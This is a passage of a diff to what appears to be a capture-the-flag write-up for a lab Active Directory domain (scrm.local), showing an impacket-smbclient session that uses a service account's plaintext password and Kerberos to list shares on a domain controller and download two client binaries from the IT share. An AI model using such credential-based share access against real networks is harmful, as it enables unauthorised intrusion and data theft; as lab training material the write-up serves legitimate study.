@@ -415,5 +415,41 @@ SMB         dc1.scrm.local  445    dc1              SYSVOL          READ        
 I now have access to the `IT` share
 
 ```python
+faketime '18:02:03.913170' impacket-smbclient scrm.local/miscsvc:'ScrambledEggs9900'@dc1.scrm.local -k -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+ADMIN$
+C$
+HR
+IPC$
+IT
+NETLOGON
+Public
+Sales
+SYSVOL
+# use IT
+# ls
+drw-rw-rw-          0  Wed Nov  3 19:32:55 2021 .
+drw-rw-rw-          0  Wed Nov  3 19:32:55 2021 ..
+drw-rw-rw-          0  Wed Nov  3 21:06:32 2021 Apps
+drw-rw-rw-          0  Wed Nov  3 19:32:44 2021 Logs
+drw-rw-rw-          0  Wed Nov  3 19:32:55 2021 Reports
+# cd Apps
+# dir
+*** Unknown syntax: dir
+# ls
+drw-rw-rw-          0  Wed Nov  3 21:06:32 2021 .
+drw-rw-rw-          0  Wed Nov  3 21:06:32 2021 ..
+drw-rw-rw-          0  Fri Nov  5 20:57:08 2021 Sales Order Client
+# cd Sales Order Client
+# ls
+drw-rw-rw-          0  Fri Nov  5 20:57:08 2021 .
+drw-rw-rw-          0  Fri Nov  5 20:57:08 2021 ..
+-rw-rw-rw-      86528  Fri Nov  5 20:57:08 2021 ScrambleClient.exe
+-rw-rw-rw-      19456  Fri Nov  5 20:57:08 2021 ScrambleLib.dll
+# get ScrambleClient.exe
+# get ScrambleLib.dll
 ```
